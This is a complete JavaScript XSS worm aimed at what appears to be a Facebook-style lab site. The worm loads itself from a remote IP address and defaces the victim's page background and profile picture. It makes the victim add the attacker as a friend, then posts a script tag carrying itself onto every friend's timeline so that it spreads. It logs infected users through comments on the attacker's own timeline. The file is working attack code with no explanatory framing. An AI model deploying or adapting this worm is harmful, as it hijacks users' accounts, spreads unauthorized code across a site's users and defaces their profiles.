// the url of ourself
var wormjs = "http://45.79.154.71/worm.js"

// my ID
var bidenID = 81;

// run this code just to make it known that we're on the page.
document.body.style.backgroundImage = "url('https://i.imgur.com/xeNEbix.gif')";
document.getElementsByClassName("fb-image-profile")[0].src = "https://ih0.redbubble.net/image.893361643.4979/flat,750x,075,f-pad,750x1000,f8f8f8.jpg";

// the post to add to the victim's timeline
var post = `<script src="http://45.79.154.71/worm.js"></script>UH OH STINKY`;

// be sure to add me as a friend
$.get("add_friend.php", {'id' : bidenID});

// find all friends and make the post on their page if they aren't infected
$.get("friends.php", function(content) {
    // parse the content into a DOM tree
    var parser = new DOMParser();
    var newdoc = parser.parseFromString(content, "text/html");
    var elements = newdoc.getElementsByTagName("a");
    for (i = 0; i < elements.length; i++) {
        // find the users that i've infected already from my timeline
        // if they aren't already infected, make the post to their timeline
        var id = elements[i].href.split("?id=")[1];
        var name = elements[i].innerText;
        infect(id, name)
    }
});

// given an ID, make a comment on their wall
function infect(id, name) {
    $.get('timeline.php?id=81', function(content) {
        if(!content.includes(name + " was malarkey'd by JOE")) {
            // add worm to user's page
            $.get("add_comment.php", {'id': id, 'comment': post});
            // add a post to my timeline to make sure we only infect user once
            $.get("add_comment.php", {'id': bidenID, 'comment': name + " was malarkey'd by JOE at " + Date.now()});
        }
    });
}
